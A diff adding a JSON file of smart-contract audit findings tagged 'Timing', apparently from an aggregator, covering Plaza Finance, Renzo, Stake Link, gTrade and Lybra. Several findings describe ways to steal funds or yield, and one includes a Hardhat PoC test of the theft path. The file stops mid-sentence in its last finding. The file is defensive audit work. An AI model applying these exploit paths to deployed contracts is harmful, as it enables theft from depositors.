@@ -1,0 +1,496 @@
+{
+  "tag": "Timing",
+  "count": 9,
+  "metadata": {
+    "totalResults": 9,
+    "totalPages": 1
+  },
+  "last_rateLimit": {
+    "limit": 20,
+    "remaining": 6,
+    "reset": 1771761120
+  },
+  "findings": [
+    {
+      "id": "49246",
+      "kind": "GIT",
+      "auditfirm_id": "3",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "2062",
+      "title": "M-6: Auction date will drift irreversibly forward over time leading to loss of yield for bond holders",
+      "content": "Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/446 \n\n## Found by \n0x52\n\n### Summary\n\nDuring the creation of the auction, lastDistribution is set to block.timestamp. Delays are compounding and will lead to loss of yield over time as the subsequent distribution will be delayed.\n\n[Pool.sol#L530-L571](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L530-L571)\n\n        function startAuction() external whenNotPaused() {\n            // Check if distribution period has passed\n    @>      require(lastDistribution + distributionPeriod < block.timestamp, DistributionPeriodNotPassed());\n\n            // Check if auction period hasn't passed\n            require(lastDistribution + distributionPeriod + auctionPeriod >= block.timestamp, AuctionPeriodPassed());\n\n            ... SNIP\n\n            // Update last distribution time\n    @>      lastDistribution = block.timestamp;\n        }\n\nAbove we see that lastDistribution is used to determine if the auction can be started. Additionally, lastDistribution is set to block.timestamp which means that any delay between lastDistribution + distributionPeriod and block.timestamp will cause loss of yield in the subsequent quarter.\n\nAccording to sherlock rules a loss of 0.01% qualifies as medium impact. The distribution period is 1 quarter or 90 days which is 7 776 000 seconds. This means that a delay of 777.6 seconds (13 minutes) will break this threshold. Given that the start of the auction is expected to be within lastDistribution + distributionPeriod + auctionPeriod it is reasonable to assume that in real world conditions that a delay of this magnitude can and will happen.\n\n### Root Cause\n\n[Pool.sol#L570](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L570) sets lastDistribution == block.timestamp\n\n### Internal preconditions\n\nNone\n\n### External preconditions\n\nstartAuction is delayed by at least 777.6 seconds\n\n### Attack Path\n\nN/A\n\n### Impact\n\nLoss of yield for bond holders\n\n### POC\n\nN/A\n\n### Mitigation\n\nInstead of setting lastDistribution to `block.timestamp` is should be set to `lastDistribution + distributionPeriod`\n\n## Discussion\n\n**sherlock-admin2**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/Convexity-Research/plaza-evm/pull/163",
+      "summary": "\nThis bug report discusses an issue with the auction date in the Plaza Finance protocol. The bug was found by user 0x52 and can lead to a loss of yield for bond holders over time. The problem lies in the code where lastDistribution is set to block.timestamp during the creation of the auction. This means that any delays between lastDistribution and block.timestamp will cause a loss of yield in the subsequent quarter. The delay threshold for this issue is 777.6 seconds, which is equivalent to 13 minutes. The root cause of this issue is that lastDistribution is set to block.timestamp. The bug can be triggered if startAuction is delayed by at least 777.6 seconds. The impact of this bug is a loss of yield for bond holders. The protocol team has fixed this issue in the Plaza Finance code.",
+      "report_date": {},
+      "contest_prize_txt": "50000 USDC",
+      "contest_link": "https://app.sherlock.xyz/audits/contests/682",
+      "sponsor_name": "",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "",
+      "github_link": "https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/446",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "682",
+      "slug": "m-6-auction-date-will-drift-irreversibly-forward-over-time-leading-to-loss-of-yield-for-bond-holders-sherlock-plaza-finance-git",
+      "firm_name": "Sherlock",
+      "firm_logo_square": "sherlock_square.png",
+      "protocol_name": "Plaza Finance",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Plaza Finance",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Timing"
+          }
+        }
+      ]
+    },
+    {
+      "id": "33501",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 2,
+      "protocol_id": "1414",
+      "title": "[M-06] `L1::xRenzoBridge` and `L2::xRenzoBridge` uses the `block.timestamp` as dependency, which can cause issues",
+      "content": "\nIn `L1::xRenzoBridge` the `block.timestamp` from L1 is encoded and sent to L2. When the message is delivered from L1 to L2  with `xRenzoBridge::_updatePrice()`, the function checks the `block.timestamp` like this:\n\n```solidity\n    if (_timestamp > block.timestamp) {\n            revert InvalidTimestamp(_timestamp);\n        }\n```\n\nThis check is done to not allow future timestamps for updating the price But the timestamps between two chains L1 and L2 are different for chain like Arbitrum as there's a possibility that the sequencer fails to post batches on the parent chain (for example, Ethereum) for a period of time.\n\nAccording to the [Arbitrum docs](<https://docs.arbitrum.io/build-decentralized-apps/arbitrum-vs-ethereum/block-numbers-and-time#block-timestamps-arbitrum-vs-ethereum>):\n\n> **Timestamp boundaries of the sequencer**\n>\n> As mentioned, block timestamps are usually set based on the sequencer's clock. Because there's a possibility that the sequencer fails to post batches on the parent chain (for example, Ethereum) for a period of time, it should have the ability to slightly adjust the timestamp of the block to account for those delays and prevent any potential reorganisations of the chain. To limit the degree to which the sequencer can adjust timestamps, some boundaries are set, currently to 24 hours earlier than the current time, and 1 hour in the future.\n\nSo the issue is that timestamp validation for `_updatePrice()` won't be effective and can reject validation both l2 tiimestamp is not related to l1 timestamp\n\n> Block timestamps on Arbitrum are not linked to the timestamp of the L1 block. They are updated every L2 block based on the sequencer's clock. These timestamps must follow these two rules:\n>\n> 1. Must be always equal or greater than the previous L2 block timestamp.\n> 2. Must fall within the established boundaries (24 hours earlier than the current time or 1 hour in the future). More on this below.\n>\n> Furthermore, for transactions that are force-included from L1 (bypassing the sequencer), the block timestamp will be equal to either the L1 timestamp when the transaction was put in the delayed inbox on L1 (not when it was force-included), or the L2 timestamp of the previous L2 block, whichever of the two timestamps is greater.\n\n### Proof of Concept\n\n[`xRenzoBridge::sendPrice`](https://github.com/code-423n4/2024-04-renzo/blob/main/contracts/Bridge/L1/xRenzoBridge.sol#L216) is used to send the price feed from L1 to L2. The\n`bytes memory _callData = abi.encode(exchangeRate, block.timestamp);` encodes the block.timestamp of L1.\n\n```solidity\n    function sendPrice(\n        CCIPDestinationParam[] calldata _destinationParam,\n        ConnextDestinationParam[] calldata _connextDestinationParam\n    ) external payable onlyPriceFeedSender nonReentrant {\n        // call getRate() to get the current price of ezETH\n        uint256 exchangeRate = rateProvider.getRate();\n\n@>      bytes memory _callData = abi.encode(exchangeRate, block.timestamp);\n\n        ...\n        ...\n    }\n```\n\nNow if we see this function [`xRenzoBridge::_updatePrice()`](https://github.com/code-423n4/2024-04-renzo/blob/main/contracts/Bridge/L2/xRenzoDeposit.sol#L345C7-L352C10), the timestamp here is compared to the timestamp of L2 is not effective to check the older price timestamps is greater than `block.timestamp` as both of these timestamps of L1 and L2 are different.\n\n```solidity\n\n    function _updatePrice(uint256 _price, uint256 _timestamp) internal {\n        // Check for 0\n        if (_price == 0) {\n            revert InvalidZeroInput();\n        }\n\n        // Check for price divergence - more than 10%\n        if (\n            (_price > lastPrice && (_price - lastPrice) > (lastPrice / 10)) ||\n            (_price < lastPrice && (lastPrice - _price) > (lastPrice / 10))\n        ) {\n            revert InvalidOraclePrice();\n        }\n\n        // Do not allow older price timestamps\n        if (_timestamp <= lastPriceTimestamp) {\n            revert InvalidTimestamp(_timestamp);\n        }\n\n        // Do not allow future timestamps\n@>      if (_timestamp > block.timestamp) {\n            revert InvalidTimestamp(_timestamp);\n        }\n\n        // Update values and emit event\n        lastPrice = _price;\n        lastPriceTimestamp = _timestamp;\n\n        emit PriceUpdated(_price, _timestamp);\n    }\n```\n\n### Recommended Mitigation Steps\n\nRemove the timestamp check in in L2 update rate.\n\n### Assessed type\n\nTiming\n\n**[jatinj615 (Renzo) acknowledged](https://github.com/code-423n4/2024-04-renzo-findings/issues/502#event-12915979432)**\n\n**[EV\\_om (warden) commented](https://github.com/code-423n4/2024-04-renzo-findings/issues/502#issuecomment-2132391915):**\n > @alcueca - I believe this finding must be invalid.\n> \n> While it is true that the sequencer can adjust the timestamp of a delayed block to up to 24 hours in the past, I believe this block will only ever include transactions that were received by the sequencer _prior_ to that timestamp.\n> \n> I have not been able to find a source to back up this claim, but this seems evident as the opposite would allow exploiting a sequencer downtime to include transactions in blocks with a timestamp in the past, which would have grave consequences for any protocol relying on block timestamps for their operations and allow manipulation of liquidations, governance votes, orders with expiration timestamps, and so on.\n> \n> If this was indeed the case, the warden would have found a much more severe vulnerability than the trivial revert here.\n> \n> On Optimism, for instance, this check is implemented [here](https://github.com/ethereum-optimism/optimism/blob/7cbda018196b58a71e2c0b4bc9e31a289235074e/packages/contracts-bedrock/src/L2/CrossL2Inbox.sol#L116).\n\n**[ladboy233 (warden) commented](https://github.com/code-423n4/2024-04-renzo-findings/issues/502#issuecomment-2132397867):**\n > > On Optimism, for instance, this check is implemented [here](https://github.com/ethereum-optimism/optimism/blob/7cbda018196b58a71e2c0b4bc9e31a289235074e/packages/contracts-bedrock/src/L2/CrossL2Inbox.sol#L116).\n> \n> The original report does not really mention optimism. The original report's concern is that the L1 / L2 timestamp is not related and use L1 timestamp to validate against L2 timestamp can revert valid price update.\n> \n> ```solidity\n> if (_timestamp > block.timestamp) {\n>           revert InvalidTimestamp(_timestamp);\n>       }\n> ```\n> \n> The L2 timestamp does not always bigger than L1 timestamp. For example, please free feel to run this POC:\n> \n> ```solidity\n> from web3 import Web3\n> import time\n> \n> # Dictionary mapping blockchain names to RPC URLs\n> rpc_urls = {\n>     'Ethereum Mainnet': 'https://eth.llamarpc.com',\n>     \"blast\": \"https://rpc.blastblockchain.com\",\n> }\n> \n> def get_block_timestamp(name, url):\n>     try:\n>         web3 = Web3(Web3.HTTPProvider(url))\n>         latest_block = web3.eth.get_block('latest')\n>         return f\"{name} block timestamp: {latest_block.timestamp}, block number {latest_block.number}\"\n>     except Exception as e:\n>         return f\"{name} Error: {e}\"\n> \n> # Query each blockchain and print the latest block's timestamp\n> for name, url in rpc_urls.items():\n>     print(get_block_timestamp(name, url))\n> ```\n> \n> The L1 `block.timestamp` is greater than blast (optimism fork) `block.timestamp` at the same time.\n> \n> Example output:\n> \n> ```solidity\n> Ethereum Mainnet block timestamp: 1716757859, block number 19956651\n> blast block timestamp:            1707500043, block number 2699354\n> ```\n>\n > From [Arbitrum docs](https://docs.arbitrum.io/build-decentralized-apps/arbitrum-vs-ethereum/block-numbers-and-time#block-timestamps-arbitrum-vs-ethereum):\n> \n> > Block timestamps on Arbitrum are not linked to the timestamp of the L1 block. \n\n**[alcueca (judge) commented](https://github.com/code-423n4/2024-04-renzo-findings/issues/502#issuecomment-2132708720):**\n > Timestamps in L1 and L2 are not related and it can't be demanded that one or the other is always greater.\n\n\n\n***\n\n",
+      "summary": "\nThe bug report discusses a potential issue with the `block.timestamp` in the L1::xRenzoBridge function. This function checks the timestamp to prevent future timestamps from being used to update the price. However, on chains like Arbitrum, the timestamps between L1 and L2 are different and can cause issues with this check. The recommended mitigation step is to remove the timestamp check in the L2 update rate. The warden and judge have acknowledged and commented on the report, with the judge stating that timestamps in L1 and L2 are not related and cannot be demanded to always be greater than the other. ",
+      "report_date": {},
+      "contest_prize_txt": "112500",
+      "contest_link": "https://code4rena.com/reports/2024-04-renzo",
+      "sponsor_name": "Renzo",
+      "sponsor_link": "",
+      "quality_score": 5,
+      "general_score": 5,
+      "source_link": "https://code4rena.com/reports/2024-04-renzo",
+      "github_link": "https://github.com/code-423n4/2024-04-renzo-findings/issues/502",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "372",
+      "slug": "m-06-l1xrenzobridge-and-l2xrenzobridge-uses-the-blocktimestamp-as-dependency-which-can-cause-issues-code4rena-renzo-renzo-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Renzo",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Renzo",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "block.number vs block.timestamp"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Timing"
+          }
+        }
+      ]
+    },
+    {
+      "id": "21188",
+      "kind": "MARKDOWN",
+      "auditfirm_id": "11",
+      "impact": "MEDIUM",
+      "finders_count": 2,
+      "protocol_id": "994",
+      "title": "The off-chain mechanism must be ensured to work in a correct order strictly",
+      "content": "**Severity:** Medium\n\n**Description:** The `PriorityPool` contract relies on the distribution oracle for accounting and the accounting calculation is done off-chain.\n\nAccording to the communication with the protocol team, the correct workflow for queued deposits can be described as below:\n- Whenever there is a new room for deposit in the staking pool, the function `depositQueuedTokens` is called.\n- The `PriorityPool` contract is paused by calling `pauseForUpdate()`.\n- Accounting calculations happen off-chain using the function `getAccountData()` and `getDepositsSinceLastUpdate()`(`depositsSinceLastUpdate`) variable to compose the latest Merkle tree.\n- The distribution oracle calls the function `updateDistribution()` and this will resume the `PriorityPool`.\n\nThe only purpose of pausing the queue contract is to prevent unqueue until the accounting status are updated.\nThrough an analysis we found that the off-chain mechanism MUST follow the order very strictly or else user funds can be stolen.\nWhile we acknowledge that the protocol team will ensure it, we decided to keep this finding as a medium risk because we can not verify the off-chain mechanism.\n\n**Impact:** If the off-chain mechanism occurs in a wrong order by any chance, user funds can be stolen.\nGiven the likelihood is low, we evaluate the impact to be Medium.\n\n**Proof of Concept:** The below test case shows the attack scenario.\n```javascript\n  it('Cyfrin: off-chain mechanism in an incorrect order can lead to user funds being stolen', async () => {\n    // try deposit 1500 while the capacity is 1000\n    await strategy.setMaxDeposits(toEther(1000))\n    await sq.connect(signers[1]).deposit(toEther(1500), true)\n\n    // 500 ether is queued for accounts[1]\n    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)\n    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)\n\n    // unqueue 500 ether should work while no updateDistribution was called\n    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))\n    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 0)\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)\n\n    // deposit again\n    await sq.connect(signers[1]).deposit(toEther(500), true)\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)\n\n    // victim deposits 500 ether and it will be queued\n    await sq.connect(signers[2]).deposit(toEther(500), true)\n    assert.equal(fromEther(await sq.totalQueued()), 1000)\n\n    // max deposit has increased to 1500\n    await strategy.setMaxDeposits(toEther(1500))\n\n    // user sees that his queued tokens 500 can be deposited and call depositQueuedTokens\n    // this will deposit the 500 ether in the queue\n    await sq.connect(signers[1]).depositQueuedTokens()\n\n    // Correct off-chain mechanism: pauseForUpdate -> getAccountData -> updateDistribution\n    // Let us see what happens if getAccountData is called before pauseForUpdate\n\n    // await sq.pauseForUpdate()\n\n    // check account data\n    var a_data = await sq.getAccountData()\n    assert.equal(ethers.utils.formatEther(a_data[2][1]), \"500.0\")\n    assert.equal(ethers.utils.formatEther(a_data[2][2]), \"500.0\")\n\n    // user calls unqueueTokens to get his 500 ether back\n    // this is possible because the queue contract is not paused\n    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))\n\n    // pauseForUpdate is called at a wrong order\n    await sq.pauseForUpdate()\n\n    // at this point user has 1000 ether staked and 9000 ether in his wallet\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)\n    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)\n\n    // now updateDistribution is called with the wrong data\n    let data = [\n      [ethers.constants.AddressZero, toEther(0), toEther(0)],\n      [accounts[1], toEther(500), toEther(500)],\n    ]\n    let tree = StandardMerkleTree.of(data, ['address', 'uint256', 'uint256'])\n\n    await sq.updateDistribution(\n      tree.root,\n      ethers.utils.formatBytes32String('ipfs'),\n      toEther(500),\n      toEther(500)\n    )\n\n    // at this point user claims his LSD tokens\n    await sq.connect(signers[1]).claimLSDTokens(toEther(500), toEther(500), tree.getProof(1))\n\n    // at this point user has 1500 ether staked and 9000 ether in his wallet\n    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)\n    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1500)\n  })\n```\n**Recommended Mitigation:** Consider to force pause the contract at the end of the function `_depositQueuedTokens`.\n\n**Client:**\nAcknowledged. The protocol team will ensure the correct order of the off-chain mechanism.\n\n**Cyfrin:** Acknowledged.",
+      "summary": "\nThe `PriorityPool` contract is used for accounting and the calculations are done off-chain. The protocol team has identified the correct workflow for queued deposits, which includes calling the `depositQueuedTokens` function, pausing the `PriorityPool` contract, and then using the functions `getAccountData()` and `getDepositsSinceLastUpdate()` to compose the latest Merkle tree. The purpose of pausing the queue contract is to prevent unqueuing until the accounting status is updated.\n\nAn analysis revealed that if the off-chain mechanism is not followed in the correct order, user funds can be stolen. This risk is considered to be medium, as the likelihood of this happening is low. A proof of concept was provided to show the attack scenario.\n\nThe recommended mitigation is to consider forcing the contract to pause at the end of the `_depositQueuedTokens` function. The protocol team has acknowledged this and will ensure the correct order of the off-chain mechanism.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "",
+      "sponsor_name": null,
+      "sponsor_link": "",
+      "quality_score": 5,
+      "general_score": 5,
+      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-08-25-cyfrin-stake-link.md",
+      "github_link": "",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "",
+      "slug": "the-off-chain-mechanism-must-be-ensured-to-work-in-a-correct-order-strictly-cyfrin-none-cyfrin-stake-link-markdown",
+      "firm_name": "Cyfrin",
+      "firm_logo_square": "Cyfrin_square.jpg",
+      "protocol_name": "Stake Link",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Cyfrin",
+        "logo_square": "Cyfrin_square.jpg"
+      },
+      "protocols_protocol": {
+        "name": "Stake Link",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Timing"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Pause"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Admin"
+          }
+        }
+      ]
+    },
+    {
+      "id": "26474",
+      "kind": "MARKDOWN",
+      "auditfirm_id": "16",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "1100",
+      "title": "[M-01] Insufficient input validation",
+      "content": "**Severity**\n\n**Impact:**\nHigh, as it can lead to stuck funds\n\n**Likelihood:**\nLow, as it requires a bad user error\n\n**Description**\n\nIn `GNSStakingV6_4_1::createUnlockSchedule` we have the `UnlockScheduleInput calldata _input` parameter, where most of the fields in the struct are properly validated to be in range of valid values. The issue is that the `start` field of the `UnlockScheduleInput` is not sufficiently validated, as it can be too further away in the future - for example 50 years in the future, due to a user error when choosing the timestamp. This would result in (almost) permanent lock of the `GNS` funds sent to the method.\n\n**Recommendations**\n\nAdd a validation that the `start` field is not too further away in the future, for example it should be max 1 year in the future.",
+      "summary": "\nThis bug report is about the `GNSStakingV6_4_1::createUnlockSchedule` method, which has a parameter called `UnlockScheduleInput calldata _input`. This parameter has a `start` field, which is not sufficiently validated, meaning that it can be too far in the future (for example 50 years) and this would cause the funds sent to the method to be permanently locked. The impact of this bug is high, as it can lead to stuck funds, but the likelihood of it happening is low, as it requires a bad user error. The recommendation is to add a validation that the `start` field is not too far in the future, for example max 1 year.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "",
+      "sponsor_name": null,
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-08-01-gTrade.md",
+      "github_link": "",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "",
+      "slug": "m-01-insufficient-input-validation-pashov-none-gtrade-markdown",
+      "firm_name": "Pashov Audit Group",
+      "firm_logo_square": "Pashov_square.png",
+      "protocol_name": "Gtrade",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Pashov Audit Group",
+        "logo_square": "Pashov_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Gtrade",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Staking Pool"
+            },
+            "score": 1
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Timing"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Missing Check"
+          }
+        }
+      ]
+    },
+    {
+      "id": "21164",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 2,
+      "protocol_id": "933",
+      "title": "[M-19] `CLOCK_MODE()` will not work properly for Arbitrum or Optimism due to `block.number`",
+      "content": "\n### Proof of Concept\n\nAccording to [Arbitrum Docs](https://developer.offchainlabs.com/time), `block.number` returns the most recently synced L1 block number. Once per minute, the block number in the `Sequencer` is synced to the actual L1 block number. Using `block.number` as a clock can lead to inaccurate timing.\n\nIt also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is it's own block.\n\n<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/governance/LybraGovernance.sol#L152>\n\n### Recommended Mitigation Steps\n\nUse `block.timestamp` rather than `block.number`\n\n### Assessed type\n\nTiming\n\n**[LybraFinance commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/114#issuecomment-1639775144):**\n > The governance contract only exists on the Ethereum mainnet.\n\n**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/114#issuecomment-1656708522)**\n\n***\n\n",
+      "summary": "\nThis bug report is about an issue with the `block.number` code in the LybraGovernance.sol contract. The `block.number` code is used to return the most recently synced L1 block number and it is synced to the actual L1 block number once per minute. The issue is that this code is not reliable when used as a clock and it also presents an issue for Optimism because each transaction is its own block.\n\nThe recommended mitigation steps to address this issue is to use `block.timestamp` instead of `block.number`. The assessed type of this bug is timing. LybraFinance commented that the governance contract only exists on the Ethereum mainnet and they acknowledged this bug.",
+      "report_date": {},
+      "contest_prize_txt": "$60,500 USDC",
+      "contest_link": "https://code4rena.com/reports/2023-06-lybra",
+      "sponsor_name": "Lybra Finance",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://code4rena.com/reports/2023-06-lybra",
+      "github_link": "https://github.com/code-423n4/2023-06-lybra-findings/issues/114",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "254",
+      "slug": "m-19-clock_mode-will-not-work-properly-for-arbitrum-or-optimism-due-to-blocknumber-code4rena-lybra-finance-lybra-finance-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Lybra Finance",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Lybra Finance",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Timing"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Optimism"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "block.number vs block.timestamp"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Arbitrum"
+          }
+        }
+      ]
+    },
+    {
+      "id": "21161",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 13,
+      "protocol_id": "933",
+      "title": "[M-16] Due to inappropriately short `votingPeriod`  and `votingDelay`, it is nearly impossible for the governance to function correctly.",
+      "content": "\n### Proof of Concept\n\nWhen making proposals with the [`Governor`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/governance/Governor.sol#L299-L308) contract OZ uses `votingPeriod`.\n\n```jsx\n        uint256 snapshot = currentTimepoint + votingDelay();\n        uint256 duration = votingPeriod();\n\n        _proposals[proposalId] = ProposalCore({\n            proposer: proposer,\n            voteStart: SafeCast.toUint48(snapshot),//@audit votingDelay() for when the voting starts\n            voteDuration: SafeCast.toUint32(duration),//@audit votingPeriod() for the duration\n            executed: false,\n            canceled: false\n        });\n```\n\nBut currently, Lybra has implemented the wrong amounts for bolt [`votingPeriod`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/governance/LybraGovernance.sol#L143-L145) and [`votingDelay`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/governance/LybraGovernance.sol#L147-L149), which means proposals from the governance will be nearly impossible to be voted on.\n\n```jsx\n    function votingPeriod() public pure override returns (uint256){\n         return 3;//@audit this should be time in blocks \n    }\n\n     function votingDelay() public pure override returns (uint256){\n         return 1;//@audit this should be time in blocks \n    }\n```\n\n### HH PoC\n\n<https://gist.github.com/0x3b33/dfd5a29d5fa50a00a149080280569d12>\n\n### Tools Used\n\nManual Review\n\n### Recommended Mitigation Steps\n\nYou can implement it as OZ suggests in their [examples](https://docs.openzeppelin.com/contracts/4.x/governance)\n\n```jsx\n    function votingDelay() public pure override returns (uint256) {\n        return 7200; // 1 day\n    }\n\n    function votingPeriod() public pure override returns (uint256) {\n        return 50400; // 1 week\n    }\n```\n\n### Assessed type\n\nGovernance\n\n**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/268#issuecomment-1635607289)**\n\n**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/268#issuecomment-1650817455)**\n\n***\n\n",
+      "summary": "\nA bug was found in the [LybraFinance](https://github.com/code-423n4/2023-06-lybra) project when using the [`Governor`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/governance/Governor.sol#L299-L308) contract. This bug was caused by incorrect amounts for bolt [`votingPeriod`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/governance/LybraGovernance.sol#L143-L145) and [`votingDelay`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/governance/LybraGovernance.sol#L147-L149). This bug would make it nearly impossible for proposals from the governance to be voted on.\n\nThis bug was discovered through manual review and the [Proof of Concept](https://gist.github.com/0x3b33/dfd5a29d5fa50a00a149080280569d12) was provided. The recommended mitigation step was to implement it as OpenZeppelin suggests in their [examples](https://docs.openzeppelin.com/contracts/4.x/governance).\n\nThe assessed type of this bug was Governance. LybraFinance acknowledged the bug and 0xean (judge) decreased the severity to Medium.",
+      "report_date": {},
+      "contest_prize_txt": "$60,500 USDC",
+      "contest_link": "https://code4rena.com/reports/2023-06-lybra",
+      "sponsor_name": "Lybra Finance",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://code4rena.com/reports/2023-06-lybra",
+      "github_link": "https://github.com/code-423n4/2023-06-lybra-findings/issues/268",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "254",
+      "slug": "m-16-due-to-inappropriately-short-votingperiod-and-votingdelay-it-is-nearly-impossible-for-the-governance-to-function-correctly-code4rena-lybra-finance-lybra-finance-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Lybra Finance",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Lybra Finance",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Timing"
+          }
+        }
+      ]
+    },
+    {
+      "id": "21160",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "933",
+      "title": "[M-15] Lack of timelock on `rigidRedemption`, enables to steal yield from other users",
+      "content": "\nThe withdraw function of the `LybraEUSDVaultBase` vaults, uses a time softlock to prevent users from hopping in and out of the protocol; to gain access to the yield generated by other users and then leave right away (by charging a small percentage from the withdrawn amount).\n\nThe same measure isn't applied to `rigidRedemptions`, which enable a user to withdraw most of the underlying assets at any time after deposit. This enables a user to deposit into the pool right before a rebase is about to happen, get access to the yield generated by other users and leave by calling `rigidRedemption` and withdraw on the tokens left by `rigidRedemption` (the amount charged on the leftovers assets, can be outbalanced by the yield).\n\nTherefore, a malicious user to get access to yield that they didn't generate, effectively stealing it from others. The amount that the user will get access to will vary based on the deposited amounts.\n\n### Proof of Concept\n\nThis issue involves 3 functions:\n\n- `withdraw(address onBehalfOf, uint256 amount)` from the `LybraEUSDVaultBase` [contract](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L98), which internally calls `checkWithdrawal(address user, uint256 amount)` to check that 3 days has passed after deposit and charges the user otherways:\n\n    ```\n    withdrawal = block.timestamp - 3 days >= depositedTime[user] ? amount : (amount * 999) / 1000;\n    ```\n\n- `rigidRedemption(address provider, uint256 eusdAmount)` from the `LybraEUSDVaultBase` [contract](<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L232>), which enables a user to withdraw the full 